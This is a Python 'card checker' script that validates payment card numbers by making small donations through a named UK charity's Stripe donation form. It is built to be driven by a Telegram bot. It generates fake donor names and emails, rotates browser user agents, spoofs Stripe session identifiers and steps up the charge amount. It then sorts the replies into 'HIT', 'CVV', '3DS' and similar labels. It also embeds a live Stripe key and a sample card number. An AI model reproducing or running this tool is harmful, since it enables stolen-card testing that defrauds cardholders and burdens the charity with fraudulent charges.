# gatet.py - River Network Charity Stripe Gateway
import requests
import random
import uuid
import json
from faker import Faker

fake = Faker("en_US")

# ========== CLASSIFICATION KEYS ==========
success_keys = ["succeeded", "success", "paid", "charge", "thank", "Thanks", "Thank", "confirmation", "Successful", "redirect"]
declined_keys = ["declined", "insufficient", "card_error", "do_not_honor", "generic_decline", "cannot be processed"]
cvv_keys = ["cvc", "cvv", "security code", "incorrect_cvv", "transaction_not_allowed"]
expired_keys = ["expired", "expired_card", "card has expired"]
otp_keys = ["3d_secure", "authenticate", "requires_action", "verifying", "action_required"]
insufficient_keys = ["insufficient_funds", "Insufficient Funds", "low funds", "balance"]

def classify_response(last):
    last_lower = str(last).lower()
    if any(key.lower() in last_lower for key in success_keys): 
        return "HIT"
    if any(key.lower() in last_lower for key in otp_keys): 
        return "3DS"
    if any(key.lower() in last_lower for key in cvv_keys): 
        return "CVV"
    if any(key.lower() in last_lower for key in expired_keys): 
        return "EXPIRED"
    if any(key.lower() in last_lower for key in insufficient_keys): 
        return "INSUFFICIENT"
    if any(key.lower() in last_lower for key in declined_keys): 
        return "DECLINED"
    return "DEAD"

def gen_random_guid():
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"

def gen_random_user_agent():
    chrome_version = random.randint(120, 137)
    user_agents = [
        f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
    ]
    return random.choice(user_agents)

def make_payment(ccx: str, amount: str):
    """
    River Network Charity - Stripe Payment Gateway
    """
    
    # Parse card details
    parts = ccx.strip().split("|")
    if len(parts) != 4:
        return "ERROR", "Invalid format. Use: number|month|year|cvv", None
    
    n, mm, yy, cvc = parts
    
    # Fix year format (2026 -> 26)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:4]
    
    # Generate random data
    first_name = fake.first_name()
    last_name = fake.last_name()
    full_name = f"{first_name} {last_name}".upper()
    email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
    
    # Stripe keys for rivernetworkcharity.org.uk
    stripe_key = "pk_live_51Op8d8GLdQ7N2bVjuMWV6qteyKXoHklyfJXorljrH32nZ9vLEJyvfN77EY4Clpdlkd1AN7xjrd17nJWolSI4bpNA004zu0cPZh"
    wallet_config_id = "978cbaf9-eff0-4883-9c7c-ba03389b50a7"
    
    session = requests.Session()
    
    # Generate random IDs for Stripe
    guid = gen_random_guid()
    muid = gen_random_guid()
    sid = gen_random_guid()
    client_session_id = gen_random_guid()
    
    # Set cookies
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    
    # ========== STEP 1: Create Payment Method ==========
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    
    stripe_data = (
        f'type=card'
        f'&billing_details[name]={full_name.replace(" ", "+")}'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2Fe96dd26916%3B+stripe-js-v3%2Fe96dd26916%3B+card-element'
        f'&referrer=https%3A%2F%2Frivernetworkcharity.org.uk'
        f'&time_on_page={random.randint(10000, 60000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
        f'&key={stripe_key}'
    )
    
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': gen_random_user_agent(),
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    try:
        response = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
    except requests.exceptions.RequestException as e:
        return "ERROR", f"NETWORK_ERROR: {str(e)}", None
    
    if response.status_code != 200:
        try:
            error_json = response.json()
            error_msg = error_json.get('error', {}).get('message', response.text[:100])
            return "ERROR", f"STRIPE_ERROR: {error_msg}", None
        except:
            return "ERROR", f"STRIPE_ERROR: {response.text[:100]}", None
    
    try:
        response_json = response.json()
        if 'id' not in response_json:
            return "ERROR", "NO_PAYMENT_METHOD_ID", None
        payment_method_id = response_json['id']
    except Exception as e:
        return "ERROR", f"JSON_PARSE_ERROR: {str(e)}", None
    
    # ========== STEP 2: Charge via WordPress ==========
    url_wp = "https://rivernetworkcharity.org.uk/wp-admin/admin-ajax.php"
    
    wp_data = {
        'action': 'wp_full_stripe_inline_donation_charge',
        'wpfs-form-name': 'RiverNetworkDonation',
        'wpfs-form-get-parameters': '{}',
        'wpfs-custom-amount': 'other',
        'wpfs-custom-amount-unique': amount,
        'wpfs-donation-frequency': 'one-time',
        'wpfs-card-holder-email': email,
        'wpfs-card-holder-name': full_name,
        'wpfs-stripe-payment-method-id': payment_method_id,
    }
    
    headers_wp = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://rivernetworkcharity.org.uk',
        'Referer': 'https://rivernetworkcharity.org.uk/giving/',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': gen_random_user_agent(),
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    try:
        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
    except requests.exceptions.RequestException as e:
        return "ERROR", f"WP_NETWORK_ERROR: {str(e)}", amount
    
    # Parse response
    try:
        response_json = r2.json()
        message = response_json.get('message', str(response_json))
        
        # Check if this amount worked
        status = classify_response(message)
        
        if status == "HIT":
            return "HIT", message, amount
        elif status == "3DS":
            return "3DS", message, amount
        elif status == "CVV":
            return "CVV", message, amount
        elif status == "EXPIRED":
            return "EXPIRED", message, amount
        elif status == "INSUFFICIENT":
            return "INSUFFICIENT", message, amount
        elif status == "DECLINED":
            if "amount" in str(message).lower() or "minimum" in str(message).lower():
                return "AMOUNT_ERROR", message, amount
            return "DECLINED", message, amount
        else:
            return "UNKNOWN", message, amount
            
    except Exception as e:
        return "ERROR", f"PARSE_ERROR: {str(e)}", amount


def Tele(ccx: str):
    """
    Check credit card with automatic amount detection
    Input: "card_number|month|year|cvv"
    Returns: response string for bot.py compatibility
    """
    
    # Try different amounts from low to high
    amounts = ["0.50", "1.00", "1.50", "2.00", "2.50", "3.00", "3.50", "4.00", "4.50", "5.00"]
    
    for amount in amounts:
        status, message, used_amount = make_payment(ccx, amount)
        
        # If it's a card error - stop trying, return immediately
        if status in ["CCN", "CVV", "EXPIRED"]:
            return message
        
        # If it's a HIT or INSUFFICIENT or 3DS - success!
        if status in ["HIT", "INSUFFICIENT", "3DS"]:
            return message
        
        # If it's DECLINED but not amount-related, return
        if status == "DECLINED":
            return message
        
        # If it's AMOUNT_ERROR, continue to next amount
        if status == "AMOUNT_ERROR":
            continue
        
        # If it's UNKNOWN or ERROR, try next amount
        if status in ["UNKNOWN", "ERROR"]:
            continue
    
    # If we tried all amounts and none worked
    return f"Amount Error: Tried all amounts but none worked"


# ========== TEST ==========
if __name__ == "__main__":
    print("=" * 50)
    print("River Network Charity - Card Checker")
    print("=" * 50)
    
    test_card = "5354563100903028|06|27|821"
    
    print(f"\n[+] Testing: {test_card}")
    print("[+] Will try amounts: 0.50 → 1.00 → 1.50 → ... → 5.00")
    print("-" * 50)
    
    result = Tele(test_card)
    print(f"Result: {result}")
